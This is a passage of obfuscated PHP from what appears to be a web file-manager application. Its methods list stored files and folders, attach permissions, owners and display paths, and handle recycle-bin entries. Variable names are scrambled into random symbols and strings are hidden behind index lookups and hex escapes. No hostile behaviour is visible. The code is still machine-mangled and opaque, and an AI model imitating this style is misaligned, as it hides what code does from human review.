$¸Ö³·›ö = array_filter(array_unique($¸Ö³·›ö)); if (!$¸Ö³·›ö) { return; } $¬ƒá†Œë = array($ŠÆ¬Ùµô[546] => array($ŠÆ¬Ùµô[494], $¸Ö³·›ö)); $ËÀëªÌŞ = $ŠÆ¬Ùµô[547]; $ÇÖŒ‰³€ = Model($ŠÆ¬Ùµô[548])->field($ËÀëªÌŞ)->where($¬ƒá†Œë)->select(); $ÇÖŒ‰³€ = array_to_keyvalue($ÇÖŒ‰³€, $ŠÆ¬Ùµô[545]); $ùê¸»à = Model($ŠÆ¬Ùµô[549])->field($ŠÆ¬Ùµô[550])->where($¬ƒá†Œë)->select(); $ùê¸»à = $ùê¸»à ? $ùê¸»à : array(); $‚«œ»š– = array(); foreach ($ùê¸»à as $¬±…Êá®) { if (!isset($‚«œ»š–[$¬±…Êá®[$ŠÆ¬Ùµô[545]]])) { $‚«œ»š–[$¬±…Êá®[$ŠÆ¬Ùµô[545]]] = array(); } $‚«œ»š–[$¬±…Êá®[$ŠÆ¬Ùµô[545]]][$¬±…Êá®[$ŠÆ¬Ùµô[97]]] = $¬±…Êá®[$ŠÆ¬Ùµô[452]]; } foreach ($Ş€Ï·ô as &$Ï±å“Ò„) { $Ò†äÖ‚Î = $Ï±å“Ò„[$ŠÆ¬Ùµô[545]]; if (!$Ò†äÖ‚Î || !is_array($ÇÖŒ‰³€[$Ò†äÖ‚Î])) { continue; } $Æ—Š—´ = $ÇÖŒ‰³€[$Ò†äÖ‚Î]; $Æ—Š—´[$ŠÆ¬Ùµô[79]] = $Ï±å“Ò„[$ŠÆ¬Ùµô[79]]; $Æ—Š—´[$ŠÆ¬Ùµô[32]] = $Ï±å“Ò„[$ŠÆ¬Ùµô[32]]; if (!$Æ—Š—´[$ŠÆ¬Ùµô[551]]) { Model($ŠÆ¬Ùµô[548])->fileMd5Check($Æ—Š—´); } if (!isset(self::$cacheFileInfo[$ŠÆ¬Ùµô[552] . $Ò†äÖ‚Î])) { self::$cacheFileInfo[$ŠÆ¬Ùµô[552] . $Ò†äÖ‚Î] = array_merge(array(), $Æ—Š—´); } unset($ÇÖŒ‰³€[$Ò†äÖ‚Î][$ŠÆ¬Ùµô[87]]); $½Ò¦Şåş = isset($‚«œ»š–[$Ò†äÖ‚Î]) && is_array($‚«œ»š–[$Ò†äÖ‚Î]) ? $‚«œ»š–[$Ò†äÖ‚Î] : array(); $Ï±å“Ò„[$ŠÆ¬Ùµô[170]] = array_merge($½Ò¦Şåş, $ÇÖŒ‰³€[$Ò†äÖ‚Î]); if (isset($Ï±å“Ò„[$ŠÆ¬Ùµô[170]][$ŠÆ¬Ùµô[184]])) { $Ï±å“Ò„[$ŠÆ¬Ùµô[184]] = json_decode($Ï±å“Ò„[$ŠÆ¬Ùµô[170]][$ŠÆ¬Ùµô[184]], !0); unset($Ï±å“Ò„[$ŠÆ¬Ùµô[170]][$ŠÆ¬Ùµô[184]]); } } unset($Ï±å“Ò„); } protected function _listAppendSourceInfo(&$¦˜‡Á³, $óÊ­×´—) { $†½ï¯â¸ =& $_SERVER[†ûãı«°]; $ÉÃÛ“Ì‘ = Model($†½ï¯â¸[553])->listData(); $Ô‘ı“Ëô = Model($†½ï¯â¸[501])->listData(); $²Ç˜àÍ™ = Model($†½ï¯â¸[491])->listData(); $ÀÜÖı¾ë = Model($†½ï¯â¸[554])->listSimple(); $å¢ò³†˜ = array_to_keyvalue($ÉÃÛ“Ì‘, $†½ï¯â¸[477]); $•õë­Ë = array_to_keyvalue_group($Ô‘ı“Ëô, $†½ï¯â¸[87], $†½ï¯â¸[502]); $›Ò¤Œ¦ = array_to_keyvalue($²Ç˜àÍ™, $†½ï¯â¸[87]); $ŒÅâä = array_to_keyvalue_group($ÀÜÖı¾ë, $†½ï¯â¸[193]); foreach ($¦˜‡Á³ as &$Á“Çûş) { $Á“Çûş[$†½ï¯â¸[90]] = array($†½ï¯â¸[555] => 0, $†½ï¯â¸[556] => 0, $†½ï¯â¸[557] => 0); if (isset($›Ò¤Œ¦[$Á“Çûş[$†½ï¯â¸[193]]])) { $Á“Çûş[$†½ï¯â¸[90]][$†½ï¯â¸[558]] = 1; $Á“Çûş[$†½ï¯â¸[90]][$†½ï¯â¸[559]] = $›Ò¤Œ¦[$Á“Çûş[$†½ï¯â¸[193]]][$†½ï¯â¸[32]]; } if ($•õë­Ë && $å¢ò³†˜ && isset($•õë­Ë[$Á“Çûş[$†½ï¯â¸[193]]])) { $Á“Çûş[$†½ï¯â¸[90]][$†½ï¯â¸[560]] = array(); foreach ($•õë­Ë[$Á“Çûş[$†½ï¯â¸[193]]] as $Ë¤ôïÛ) { $¸³•’õ· = $å¢ò³†˜[$Ë¤ôïÛ]; $Á“Çûş[$†½ï¯â¸[90]][$†½ï¯â¸[560]][] = array($†½ï¯â¸[561] => $¸³•’õ·[$†½ï¯â¸[477]], $†½ï¯â¸[496] => $¸³•’õ·[$†½ï¯â¸[32]], $†½ï¯â¸[562] => $¸³•’õ·[$†½ï¯â¸[563]]); } } if ($ŒÅâä && isset($ŒÅâä[$Á“Çûş[$†½ï¯â¸[193]]])) { $Á“Çûş[$†½ï¯â¸[90]][$†½ï¯â¸[564]] = array(); foreach ($ŒÅâä[$Á“Çûş[$†½ï¯â¸[193]]] as $»¶ò–é) { $ÆöÏ¯ø = $†½ï¯â¸[565]; if ($»¶ò–é[$†½ï¯â¸[566]] == $†½ï¯â¸[91]) { $ÆöÏ¯ø .= $†½ï¯â¸[567]; } $Á“Çûş[$†½ï¯â¸[90]][$†½ï¯â¸[564]] = array_field_key($»¶ò–é, explode($†½ï¯â¸[50], $ÆöÏ¯ø)); } } } unset($Á“Çûş); return $¦˜‡Á³; } protected function _listAppendChildren(&$ƒ‹Øê, $ªéÄéÏ) { $ŒÂç‰Èí =& $_SERVER[†ûãı«°]; $Î‘¢ÁÌŸ = array(); $­¤Şø¥ = array($ŒÂç‰Èí[241] => 0, $ŒÂç‰Èí[242] => 0); foreach ($ƒ‹Øê as &$Ò“ìÏˆË) { if (!$Ò“ìÏˆË[$ŒÂç‰Èí[487]]) { continue; } $Î‘¢ÁÌŸ[] = $Ò“ìÏˆË[$ŒÂç‰Èí[193]]; } unset($Ò“ìÏˆË); if (!$Î‘¢ÁÌŸ) { return; } $Á’·¸© = array($ŒÂç‰Èí[192] => array($ŒÂç‰Èí[7], $Î‘¢ÁÌŸ), $ŒÂç‰Èí[507] => 0); $Š£ ò© = array($ŒÂç‰Èí[192], $ŒÂç‰Èí[487], $ŒÂç‰Èí[568] => $ŒÂç‰Èí[569]); $Ù¸ò÷ = $this->field($Š£ ò©)->where($Á’·¸©)->group($ŒÂç‰Èí[570])->select(); $¡ßÁøö = array(); foreach ($Ù¸ò÷ as $ää¤é­­) { $Üà…«ÏŞ = $ää¤é­­[$ŒÂç‰Èí[192]]; $¤Û­…¹ö = $ää¤é­­[$ŒÂç‰Èí[487]] == $ŒÂç‰Èí[91] ? $ŒÂç‰Èí[242] : $ŒÂç‰Èí[241]; if (!isset($¡ßÁøö[$Üà…«ÏŞ])) { $¡ßÁøö[$Üà…«ÏŞ] = array($ŒÂç‰Èí[241] => 0, $ŒÂç‰Èí[242] => 0); } $¡ßÁøö[$Üà…«ÏŞ][$¤Û­…¹ö] += $ää¤é­­[$ŒÂç‰Èí[569]]; } foreach ($ƒ‹Øê as &$Ò“ìÏˆË) { if (!$Ò“ìÏˆË[$ŒÂç‰Èí[487]]) { continue; } $ã¦›İ¿Î = is_array($¡ßÁøö[$Ò“ìÏˆË[$ŒÂç‰Èí[193]]]) ? $¡ßÁøö[$Ò“ìÏˆË[$ŒÂç‰Èí[193]]] : $­¤Şø¥; $Ò“ìÏˆË[$ŒÂç‰Èí[242]] = $ã¦›İ¿Î[$ŒÂç‰Èí[242]]; $Ò“ìÏˆË[$ŒÂç‰Èí[241]] = $ã¦›İ¿Î[$ŒÂç‰Èí[241]]; unset($Ò“ìÏˆË[$ŒÂç‰Èí[488]]); } unset($Ò“ìÏˆË); } protected function _listAppendAuth(&$Â¸´¶Çµ) { $¾’ÚøÅ =& $_SERVER[†ûãı«°]; $Ú£ü§æÖ = array(); foreach ($Â¸´¶Çµ as $¡½Ë¼÷Ó) { if ($¡½Ë¼÷Ó[$¾’ÚøÅ[190]] == self::TYPE_GROUP) { $Ú£ü§æÖ[] = $¡½Ë¼÷Ó[$¾’ÚøÅ[193]]; } } if (!$Ú£ü§æÖ) { return; } $“äì¨Ÿ = array_to_keyvalue($Â¸´¶Çµ, $¾’ÚøÅ[193]); $¸¹µŠ¾ = Model($¾’ÚøÅ[571])->getSourceList($Ú£ü§æÖ, $“äì¨Ÿ); $ë•÷†÷“ = KodUser::isRoot(); foreach ($Â¸´¶Çµ as $¤„×¤àÆ => &$¡½Ë¼÷Ó) { $¡½Ë¼÷Ó[$¾’ÚøÅ[489]] = $¸¹µŠ¾[$¡½Ë¼÷Ó[$¾’ÚøÅ[193]]]; if (!$¡½Ë¼÷Ó[$¾’ÚøÅ[489]] && $¡½Ë¼÷Ó[$¾’ÚøÅ[190]] == self::TYPE_GROUP) { $¡½Ë¼÷Ó[$¾’ÚøÅ[489]] = Action($¾’ÚøÅ[572])->pathGroupAuthMake($¡½Ë¼÷Ó[$¾’ÚøÅ[573]]); if (!$¡½Ë¼÷Ó[$¾’ÚøÅ[489]] && !$ë•÷†÷“) { $¡½Ë¼÷Ó[$¾’ÚøÅ[235]] = !1; $¡½Ë¼÷Ó[$¾’ÚøÅ[234]] = !1; } } if ($¡½Ë¼÷Ó[$¾’ÚøÅ[489]]) { $¡½Ë¼÷Ó[$¾’ÚøÅ[235]] = AuthModel::authCheckEdit($¡½Ë¼÷Ó[$¾’ÚøÅ[489]][$¾’ÚøÅ[490]]); $¡½Ë¼÷Ó[$¾’ÚøÅ[234]] = AuthModel::authCheckView($¡½Ë¼÷Ó[$¾’ÚøÅ[489]][$¾’ÚøÅ[490]]); } $this->groupPathDisplay($¡½Ë¼÷Ó); } unset($¡½Ë¼÷Ó); } public function _listAppendAuthSecret(&$ç¿Û—Éä) { $­ÖÊÔÔ =& $_SERVER[†ûãı«°]; if (Model($­ÖÊÔÔ[510])->get($­ÖÊÔÔ[574]) != $­ÖÊÔÔ[91]) { return; } static $Œğ«ç¦‘ = false; if (!$Œğ«ç¦‘) { $”í¶ÄË‡ = Model($­ÖÊÔÔ[575]); $ĞèßŸ = Model($­ÖÊÔÔ[576]); $Œğ«ç¦‘ = $ĞèßŸ->listData(); $Œğ«ç¦‘ = array_to_keyvalue($Œğ«ç¦‘, $­ÖÊÔÔ[193]); $âèŞ‘ = json_decode(Model($­ÖÊÔÔ[510])->get($­ÖÊÔÔ[577]), !0); $âèŞ‘ = array_to_keyvalue($âèŞ‘, $­ÖÊÔÔ[477]); foreach ($Œğ«ç¦‘ as $•ø½Œâ… => $½ã´ÀĞ‚) { $ù¶Ë€ÈÛ = $âèŞ‘[$½ã´ÀĞ‚[$­ÖÊÔÔ[578]]]; if (!$ù¶Ë€ÈÛ) { $ĞèßŸ->remove($½ã´ÀĞ‚[$­ÖÊÔÔ[477]]); unset($Œğ«ç¦‘[$•ø½Œâ…]); continue; } $˜¾œ¥ÓÑ = $”í¶ÄË‡->listData($ù¶Ë€ÈÛ[$­ÖÊÔÔ[489]]); if (!$˜¾œ¥ÓÑ) { $ĞèßŸ->remove($½ã´ÀĞ‚[$­ÖÊÔÔ[477]]); unset($Œğ«ç¦‘[$•ø½Œâ…]); continue; } $½ã´ÀĞ‚[$­ÖÊÔÔ[489]] = $˜¾œ¥ÓÑ; $½ã´ÀĞ‚[$­ÖÊÔÔ[579]] = $ù¶Ë€ÈÛ; $½ã´ÀĞ‚[$­ÖÊÔÔ[580]] = Model($­ÖÊÔÔ[581])->getInfoSimpleOuter($½ã´ÀĞ‚[$­ÖÊÔÔ[529]]); $Œğ«ç¦‘[$•ø½Œâ…] = $½ã´ÀĞ‚; } } $‡©µË‚› = USER_ID; $‘³›½³è = array(); $¯Ç„›‘ = $this->_listAppendPath($‘³›½³è, !0); foreach ($ç¿Û—Éä as $•ø½Œâ… => &$½ã´ÀĞ‚) { if (!is_array($½ã´ÀĞ‚[$­ÖÊÔÔ[489]])) { continue; } if ($½ã´ÀĞ‚[$­ÖÊÔÔ[190]] != $­ÖÊÔÔ[582]) { continue; } if (isset($Œğ«ç¦‘[$½ã´ÀĞ‚[$­ÖÊÔÔ[193]]])) { $¤Ó…ÕÍ€ = $Œğ«ç¦‘[$½ã´ÀĞ‚[$­ÖÊÔÔ[193]]]; if (!is_array($½ã´ÀĞ‚[$­ÖÊÔÔ[543]])) { $½ã´ÀĞ‚[$­ÖÊÔÔ[543]] = array(); } $½ã´ÀĞ‚[$­ÖÊÔÔ[543]][$­ÖÊÔÔ[583]] = $¤Ó…ÕÍ€[$­ÖÊÔÔ[578]]; $½ã´ÀĞ‚[$­ÖÊÔÔ[489]][$­ÖÊÔÔ[584]] = $¤Ó…ÕÍ€; $½ã´ÀĞ‚[$­ÖÊÔÔ[489]][$­ÖÊÔÔ[585]] = $½ã´ÀĞ‚[$­ÖÊÔÔ[586]]; $½ã´ÀĞ‚[$­ÖÊÔÔ[489]][$­ÖÊÔÔ[587]] = $­ÖÊÔÔ[91]; if ($¤Ó…ÕÍ€[$­ÖÊÔÔ[529]] != $‡©µË‚›) { $½ã´ÀĞ‚[$­ÖÊÔÔ[489]][$­ÖÊÔÔ[490]] = $½ã´ÀĞ‚[$­ÖÊÔÔ[489]][$­ÖÊÔÔ[490]] & $¤Ó…ÕÍ€[$­ÖÊÔÔ[489]][$­ÖÊÔÔ[489]]; } continue; } $Äß¢ÓÈÈ = $this->parentLevelArray($½ã´ÀĞ‚[$­ÖÊÔÔ[588]]); $³ÒÁäÏ = array_reverse($Äß¢ÓÈÈ); foreach ($³ÒÁäÏ as $—Æ¦ô˜ñ => $¸“Æ×Ÿ) { if (!isset($Œğ«ç¦‘[$¸“Æ×Ÿ])) { continue; } $¤Ó…ÕÍ€ = $Œğ«ç¦‘[$¸“Æ×Ÿ]; $½ã´ÀĞ‚[$­ÖÊÔÔ[489]][$­ÖÊÔÔ[584]] = $¤Ó…ÕÍ€; if ($¤Ó…ÕÍ€[$­ÖÊÔÔ[529]] != $‡©µË‚›) { $½ã´ÀĞ‚[$­ÖÊÔÔ[489]][$­ÖÊÔÔ[490]] = $½ã´ÀĞ‚[$­ÖÊÔÔ[489]][$­ÖÊÔÔ[490]] & $¤Ó…ÕÍ€[$­ÖÊÔÔ[489]][$­ÖÊÔÔ[489]]; } $ºœÁ»Ë÷ = $­ÖÊÔÔ[12]; $»Èµ†Ã = count($Äß¢ÓÈÈ) - $—Æ¦ô˜ñ; for ($ä­•ô¯í = 0; $ä­•ô¯í < $»Èµ†Ã; $ä­•ô¯í++) { if (!isset($¯Ç„›‘[$Äß¢ÓÈÈ[$ä­•ô¯í]])) { $ºœÁ»Ë÷ = $­ÖÊÔÔ[12]; break; } $ºœÁ»Ë÷ = $ºœÁ»Ë÷ . rtrim($¯Ç„›‘[$Äß¢ÓÈÈ[$ä­•ô¯í]], $­ÖÊÔÔ[8]) . $­ÖÊÔÔ[8]; } $½ã´ÀĞ‚[$­ÖÊÔÔ[489]][$­ÖÊÔÔ[585]] = rtrim($ºœÁ»Ë÷, $­ÖÊÔÔ[8]) . $­ÖÊÔÔ[8]; break; } } unset($½ã´ÀĞ‚); } public function groupPathDisplay(&$†¨¶ÂÙÎ) { $¼ìî„‹ =& $_SERVER[†ûãı«°]; if ($†¨¶ÂÙÎ[$¼ìî„‹[190]] != self::TYPE_GROUP) { return; } $õ¶¸©´ì = Model($¼ìî„‹[589])->getInfo($†¨¶ÂÙÎ[$¼ìî„‹[573]]); $•ˆÂïßª = $this->parentLevelArray($õ¶¸©´ì[$¼ìî„‹[588]]); $àíõàÒ© = $¼ìî„‹[12]; foreach ($•ˆÂïßª as $‡ş´”˜¦) { $Á²»äË = Model($¼ìî„‹[589])->getInfo($‡ş´”˜¦); $àíõàÒ© .= $Á²»äË[$¼ìî„‹[90]][$¼ìî„‹[193]] . $¼ìî„‹[50]; } $†¨¶ÂÙÎ[$¼ìî„‹[590]] = $õ¶¸©´ì[$¼ìî„‹[192]]; $†¨¶ÂÙÎ[$¼ìî„‹[591]] = $õ¶¸©´ì[$¼ìî„‹[588]]; $†¨¶ÂÙÎ[$¼ìî„‹[592]] = $õ¶¸©´ì[$¼ìî„‹[593]]; $†¨¶ÂÙÎ[$¼ìî„‹[594]] = $àíõàÒ© . $õ¶¸©´ì[$¼ìî„‹[90]][$¼ìî„‹[193]]; } protected function _listAppendPath(&$±Êô¾’ö, $áù‡—¡± = false) { $×ë³àë² =& $_SERVER[†ûãı«°]; static $Ç›˜‡Ñ„ = array(); $‘‹˜“´– = array(); $ÑŸº¡× = array(); if ($áù‡—¡±) { return $Ç›˜‡Ñ„; } foreach ($±Êô¾’ö as &$¨¥åËÑ ) { $“ ›†ş± = $¨¥åËÑ [$×ë³àë²[193]]; if ($¨¥åËÑ [$×ë³àë²[487]] == $×ë³àë²[91] && $¨¥åËÑ [$×ë³àë²[192]] != 0) { $Ç›˜‡Ñ„[$“ ›†ş±] = $¨¥åËÑ [$×ë³àë²[32]]; } if ($¨¥åËÑ [$×ë³àë²[487]] == $×ë³àë²[91] && $¨¥åËÑ [$×ë³àë²[192]] == 0) { $Ç›˜‡Ñ„[$“ ›†ş±] = $this->_listAppendPathRoot($¨¥åËÑ , array()); } if (isset($ÑŸº¡×[$¨¥åËÑ [$×ë³àë²[588]]])) { continue; } $ÑŸº¡×[$¨¥åËÑ [$×ë³àë²[588]]] = !0; $ºÉµŠÅË = $this->parentLevelArray($¨¥åËÑ [$×ë³àë²[588]]); foreach ($ºÉµŠÅË as $‰ŸÚ¼Ğ => $‚ÍíÖ³¾) { if (isset($Ç›˜‡Ñ„[$‚ÍíÖ³¾])) { continue; } if ($‰ŸÚ¼Ğ == 0) { $Ç›˜‡Ñ„[$‚ÍíÖ³¾] = $this->_listAppendPathRoot($¨¥åËÑ , $ºÉµŠÅË); } if ($‰ŸÚ¼Ğ != 0) { $‘‹˜“´–[] = $‚ÍíÖ³¾; } } } unset($¨¥åËÑ ); $‘‹˜“´– = array_unique($‘‹˜“´–); if (count($‘‹˜“´–) > 0) { $»…Ø¶¥ = array($×ë³àë²[493] => array($×ë³àë²[494], $‘‹˜“´–)); if (count($‘‹˜“´–) == 1) { $ßÛ¥Şè = $this->sourceInfo($‘‹˜“´–[0]); $ÅË±¬â› = is_array($ßÛ¥Şè) ? array($ßÛ¥Şè) : !1; } else { $ÅË±¬â› = $this->field($×ë³àë²[595])->where($»…Ø¶¥)->select(); } if (!$ÅË±¬â›) { $ÅË±¬â› = array(); } foreach ($ÅË±¬â› as $¬Œø§´ö) { $Ç›˜‡Ñ„[$¬Œø§´ö[$×ë³àë²[193]]] = $¬Œø§´ö[$×ë³àë²[32]]; } } $µ„Äí = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ñµºì€ô = array(); foreach ($±Êô¾’ö as &$¨¥åËÑ ) { $Ş×ïÛÃË = $¨¥åËÑ [$×ë³àë²[588]]; $ø˜éæöù = $×ë³àë²[12]; if (isset($ñµºì€ô[$Ş×ïÛÃË])) { $ø˜éæöù = $ñµºì€ô[$Ş×ïÛÃË]; } else { $ºÉµŠÅË = $this->parentLevelArray($¨¥åËÑ [$×ë³àë²[588]]); foreach ($ºÉµŠÅË as $‰ŸÚ¼Ğ => $‚ÍíÖ³¾) { if (isset($Ç›˜‡Ñ„[$‚ÍíÖ³¾])) { $ø˜éæöù .= $Ç›˜‡Ñ„[$‚ÍíÖ³¾] . $×ë³àë²[8]; } } $ñµºì€ô[$Ş×ïÛÃË] = $ø˜éæöù; } $ø˜éæöù .= $¨¥åËÑ [$×ë³àë²[32]]; if ($¨¥åËÑ [$×ë³àë²[487]] == $×ë³àë²[91]) { $ø˜éæöù .= $×ë³àë²[8]; } $¨¥åËÑ [$×ë³àë²[586]] = str_replace($×ë³àë²[256], $×ë³àë²[8], $ø˜éæöù); if ($¨¥åËÑ [$×ë³àë²[192]] == $×ë³àë²[230]) { $¨¥åËÑ [$×ë³àë²[32]] = trim($Ç›˜‡Ñ„[$¨¥åËÑ [$×ë³àë²[193]]], $×ë³àë²[8]); $¨¥åËÑ [$×ë³àë²[586]] = $¨¥åËÑ [$×ë³àë²[32]] . $×ë³àë²[8]; } if (intval($¨¥åËÑ [$×ë³àë²[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¨¥åËÑ , $ºÉµŠÅË, $µ„Äí); } } unset($¨¥åËÑ ); return $±Êô¾’ö; } private function _listAppendPathRecycle(&$Ë¬áÉÒ, $ä‡÷¹, $Û€“ÕšÃ) { $ÚÄÙá…— =& $_SERVER[†ûãı«°]; if (!in_array($Û€“ÕšÃ, $ä‡÷¹) && $Ë¬áÉÒ[$ÚÄÙá…—[193]] != $Û€“ÕšÃ) { return; } $ÒçÍ¿Èî = explode($ÚÄÙá…—[8], trim($Ë¬áÉÒ[$ÚÄÙá…—[586]], $ÚÄÙá…—[8])); $ßš•÷Ÿè = implode($ÚÄÙá…—[8], array_slice($ÒçÍ¿Èî, 2)); $Ë¬áÉÒ[$ÚÄÙá…—[586]] = $ÚÄÙá…—[8] . LNG($ÚÄÙá…—[596]) . $ÚÄÙá…—[8] . ltrim($ßš•÷Ÿè, $ÚÄÙá…—[8]); $Ë¬áÉÒ[$ÚÄÙá…—[588]] = $ÚÄÙá…—[597] . implode($ÚÄÙá…—[50], array_slice($ä‡÷¹, 1)) . $ÚÄÙá…—[50]; if ($Ë¬áÉÒ[$ÚÄÙá…—[193]] == $Û€“ÕšÃ) { $Ë¬áÉÒ[$ÚÄÙá…—[588]] = $ÚÄÙá…—[597]; $Ë¬áÉÒ[$ÚÄÙá…—[192]] = $ÚÄÙá…—[230]; $Ë¬áÉÒ[$ÚÄÙá…—[32]] = LNG($ÚÄÙá…—[596]); } $Ë¬áÉÒ[$ÚÄÙá…—[598]] = $ÚÄÙá…—[599]; } protected function _listAppendPathRoot(&$Ï´ÇÏˆ, $”Ö—¾„) { $×¤©“ =& $_SERVER[†ûãı«°]; static $¹ô¿·ê = false; static $¥¸ä£²– = false; $ÅåÃÔÅÎ = $×¤©“[12]; if ($Ï´ÇÏˆ[$×¤©“[190]] == self::TYPE_USER) { if ($Ï´ÇÏˆ[$×¤©“[573]] == USER_ID) { $ÅåÃÔÅÎ = LNG($×¤©“[600]); if ($¹ô¿·ê === !1) { $Ò–Ÿ¤‘ = Model($×¤©“[601])->getInfoFull(USER_ID); $¹ô¿·ê = _get($Ò–Ÿ¤‘, $×¤©“[602], $×¤©“[12]); } if ($¥¸ä£²– === !1) { $Ò–Ÿ¤‘ = Model($×¤©“[601])->getInfoFull(USER_ID); $¥¸ä£²– = _get($Ò–Ÿ¤‘, $×¤©“[603], $×¤©“[12]); } if ($”Ö—¾„ && $”Ö—¾„[0] == $¹ô¿·ê || !$”Ö—¾„ && $Ï´ÇÏˆ[$×¤©“[193]] == $¹ô¿·ê) { $ÅåÃÔÅÎ = LNG($×¤©“[604]); $Ï´ÇÏˆ[$×¤©“[605]] = $×¤©“[606]; } if ($”Ö—¾„ && $”Ö—¾„[0] == $¥¸ä£²– || !$”Ö—¾„ && $Ï´ÇÏˆ[$×¤©“[193]] == $¥¸ä£²–) { $ÅåÃÔÅÎ = $ÅåÃÔÅÎ . $×¤©“[607] . LNG($×¤©“[608]); } if (!$”Ö—¾„) { $Ï´ÇÏˆ[$×¤©“[32]] = $ÅåÃÔÅÎ; } } else { $Ò–Ÿ¤‘ = Model($×¤©“[601])->getInfoFull($Ï´ÇÏˆ[$×¤©“[573]]); $ó»ÀÁñ  = _get($Ò–Ÿ¤‘, $×¤©“[603], $×¤©“[12]); $Ï´ÇÏˆ[$×¤©“[609]] = Model($×¤©“[581])->getInfoSimpleOuter($Ï´ÇÏˆ[$×¤©“[573]]); $ÅåÃÔÅÎ = LNG($×¤©“[610]) . $×¤©“[176] . $Ï´ÇÏˆ[$×¤©“[609]][$×¤©“[32]] . $×¤©“[178]; if ($”Ö—¾„ && $”Ö—¾„[0] == $ó»ÀÁñ  || !$”Ö—¾„ && $Ï´ÇÏˆ[$×¤©“[193]] == $ó»ÀÁñ ) { $ÅåÃÔÅÎ = LNG($×¤©“[610]) . $×¤©“[611] . $Ï´ÇÏˆ[$×¤©“[609]][$×¤©“[32]] . $×¤©“[607] . LNG($×¤©“[608]) . $×¤©“[178]; } } } else { if ($Ï´ÇÏˆ[$×¤©“[190]] == self::TYPE_GROUP) { $ˆı‡¿É½ = Model($×¤©“[589])->getInfoSimple($Ï´ÇÏˆ[$×¤©“[573]]); $ÅåÃÔÅÎ = $ˆı‡¿É½[$×¤©“[32]]; } else { if ($Ï´ÇÏˆ[$×¤©“[190]] == self::TYPE_SYSTEM) { $ÅåÃÔÅÎ = $×¤©“[612]; } } } $ÅåÃÔÅÎ = $ÅåÃÔÅÎ ? $×¤©“[8] . $ÅåÃÔÅÎ . $×¤©“[8] : $×¤©“[8]; return $ÅåÃÔÅÎ; } protected function _listAppendUser(&$ÖÒ×Ğä¨) { $è§›í•É =& $_SERVER[†ûãı«°]; $ˆİöúèş = array_to_keyvalue($ÖÒ×Ğä¨, $è§›í•É[12], $è§›í•É[529]); $Ş¶Éğ¸” = array_to_keyvalue($ÖÒ×Ğä¨, $è§›í•É[12], $è§›í•É[531]); $’€¶€·ƒ = array_merge($ˆİöúèş, $Ş¶Éğ¸”); $‘íûƒ³ = Model($è§›í•É[601])->userListInfo($’€¶€·ƒ); foreach ($ÖÒ×Ğä¨ as &$éË†´ÃÙ) { $¢Æ¢ß´£ = $éË†´ÃÙ[$è§›í•É[529]]; $éË†´ÃÙ[$è§›í•É[529]] = $‘íûƒ³[$¢Æ¢ß´£] ? $‘íûƒ³[$¢Æ¢ß´£] : !1; $¢Æ¢ß´£ = $éË†´ÃÙ[$è§›í•É[531]]; $éË†´ÃÙ[$è§›í•É[531]] = $‘íûƒ³[$¢Æ¢ß´£] ? $‘íûƒ³[$¢Æ¢ß´£] : !1; if (_get($éË†´ÃÙ, $è§›í•É[613], 0)) { $ßÛ‰“ÁÉ = $GLOBALS[$è§›í•É[6]][$è§›í•É[92]][$è§›í•É[614]]; if ($éË†´ÃÙ[$è§›í•É[543]][$è§›í•É[615]] <= time() - $ßÛ‰“ÁÉ) { $this->metaSet($éË†´ÃÙ[$è§›í•É[193]], $è§›í•É[616], null); $this->metaSet($éË†´ÃÙ[$è§›í•É[193]], $è§›í•É[615], null); unset($éË†´ÃÙ[$è§›í•É[543]][$è§›í•É[616]]); continue; } $­È»Øå¨ = $éË†´ÃÙ[$è§›í•É[543]][$è§›í•É[616]]; $éË†´ÃÙ[$è§›í•É[543]][$è§›í•É[617]] = Model($è§›í•É[601])->getInfoSimpleOuter($­È»Øå¨); } } unset($éË†´ÃÙ); } public function parentLevelArray($Ê¾Á÷¿ò) { $°âßˆ¼ú =& $_SERVER[†ûãı«°]; $Ê¾Á÷¿ò = explode($°âßˆ¼ú[50], trim($Ê¾Á÷¿ò, $°âßˆ¼ú[50])); return array_remove_value($Ê¾Á÷¿ò, $°âßˆ¼ú[230]); } public function listAll($ÚüÏ€¸ñ) { $ ˜æè¨ =& $_SERVER[†ûãı«°]; $ÍõÆßšŞ = $this->sourceInfo($ÚüÏ€¸ñ); $íš§Â«Ÿ = array($ ˜æè¨[618] => array($ ˜æè¨[619], $ÍõÆßšŞ[$ ˜æè¨[588]] . $ÚüÏ€¸ñ . $ ˜æè¨[620]), $ ˜æè¨[621] => 0); $êÄÏ£Ğ¿ = $ ˜æè¨[622]; $É±‡º° = "\x4c\105\106\x54\40\112\117\111\116\x20{$this->tablePrefix}\151\x6f\x5f\x66\x69\x6c\x65\x20\x66\x69\x6c\x65\x20\157\x6e\x20\x73\x6f\x75\x72\x63\145\x2e\146\151\154\145\111\x44\40\x3d\x20\146\151\154\145\x2e\146\151\x6c\x65\x49\104"; $²½Ñ×Â÷ = $this->alias($ ˜æè¨[521])->field($êÄÏ£Ğ¿)->where($íš§Â«Ÿ)->join($É±‡º°)->select(); $this->_listAppendAuth($²½Ñ×Â÷); $this->_listAppendUser($²½Ñ×Â÷); $this->_listAppendPath($²½Ñ×Â÷); $²½Ñ×Â÷ = array_to_keyvalue($²½Ñ×Â÷, $ ˜æè¨[193]); $ÙÑ»’©á = "\x2f{$ÍõÆßšŞ[$ ˜æè¨[32]]}\57"; $ÙÑ»’©á = $ÙÑ»’©á == $ ˜æè¨[256] ? $ ˜æè¨[8] : $ÙÑ»’©á; $›¦ùÔ½Å = array(); foreach ($²½Ñ×Â÷ as $ƒÉíô¡ => $ò™úĞß) { $Øæ£ğÁ = $this->parentLevelArray($ò™úĞß[$ ˜æè¨[588]]); array_shift($Øæ£ğÁ); $¥–Öô‚Ø = $ÙÑ»’©á; for ($š„ £æª = 0; $š„ £æª < count($Øæ£ğÁ); $š„ £æª++) { $¥–Öô‚Ø .= $²½Ñ×Â÷[$Øæ£ğÁ[$š„ £æª]][$ ˜æè¨[32]] . $ ˜æè¨[8]; } $¥–Öô‚Ø .= $ò™úĞß[$ ˜æè¨[32]]; if ($ò™úĞß[$ ˜æè¨[487]]) { $¥–Öô‚Ø .= $ ˜æè¨[8]; } $ı§…ì®¡ = array($ ˜æè¨[497] => str_replace($ ˜æè¨[256], $ ˜æè¨[8], str_replace($ ˜æè¨[256], $ ˜æè¨[8], str_replace($ ˜æè¨[256], $ ˜æè¨[8], $¥–Öô‚Ø))), $ ˜æè¨[623] => intval($ò™úĞß[$ ˜æè¨[487]]), $ ˜æè¨[624] => 